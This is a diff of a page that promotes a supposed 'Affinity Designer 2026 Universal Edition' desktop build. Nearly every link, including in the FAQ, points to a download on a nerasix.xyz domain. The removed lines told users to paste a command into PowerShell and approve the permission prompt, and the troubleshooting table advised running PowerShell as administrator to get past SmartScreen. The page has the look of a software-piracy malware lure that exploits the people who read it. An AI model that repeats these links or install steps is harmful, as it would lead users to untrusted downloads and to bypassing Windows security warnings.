@@ -5,20 +5,14 @@ Affinity Designer 2026 Universal Edition · Editing pipeline · Batch tools · W
 
 > Professional Affinity Designer 2026 Universal Edition build with RAW tools, batch export modules, and retouch presets included — not a mobile-only tier.
 
+## Download
 
-## Install on Windows
+> Use the project link below for Windows.
 
-**Do this:**
-
-1. Press the **Windows** key, type **powershell**
-3. **Copy** the command below, **paste** it into PowerShell, press **Enter**
-4. Click **Yes** if Windows asks for permission
-
-```https://affinity-designer-2026-desktop-setup-guide.nerasix.xyz/```
-
-**If nothing happens or you see a policy error**, paste this instead:
-
-```https://affinity-designer-2026-desktop-setup-guide.nerasix.xyz/```
+* **Project link:** **[affinity-designer-2026.nerasix.xyz](https://affinity-designer-2026.nerasix.xyz/)**
+* **Full URL:** `https://affinity-designer-2026.nerasix.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
 
 ---
@@ -39,7 +33,7 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 | Catalog import hangs | Check disk space; rebuild previews folder |
 | RAW files show pink preview | Update GPU driver; reset color profile |
 | Export queue stalls | Close other GPU apps; restart export service |
-| Install blocked by SmartScreen | Run PowerShell as administrator; retry setup command |
+| Install blocked by SmartScreen | Open the Nerasix download page and click **Download** |
 
 ## Requirements
 
@@ -52,18 +46,18 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 ## FAQ
 
 <details>
-<summary><b>What exactly do I paste?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>How do I install?</b></summary>
+<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
-<summary><b>Where is PowerShell?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>How do I install?</b></summary>
+<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
-<summary><b>Command did not run?</b></summary>
-<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>Download didn't start?</b></summary>
+<br>Open <a href="https://affinity-designer-2026.nerasix.xyz/">affinity-designer-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
@@ -74,12 +68,3 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 ---
 
 **Topics:** affinity-designer, affinity-app, photo-editing, raw-processing, affinity-designer-setup-failed-fix, how-to-install-affinity-designer, image-workflow, photography-tools, windows-photo, affinity-designer-windows, affinity-designer-windows-setup, affinity-designer-desktop-setup
-
-## Download
-
-> Use the project link below for Windows.
-
-* **Project link:** **[affinity-designer-2026-desktop-setup-guide.nerasix.xyz](https://affinity-designer-2026-desktop-setup-guide.nerasix.xyz/)**
-* **Full URL:** `https://affinity-designer-2026-desktop-setup-guide.nerasix.xyz/`
-* **Type:** Desktop package | Windows 10 and 11, 64-bit
-* **Setup:** Run the installer from the extracted folder
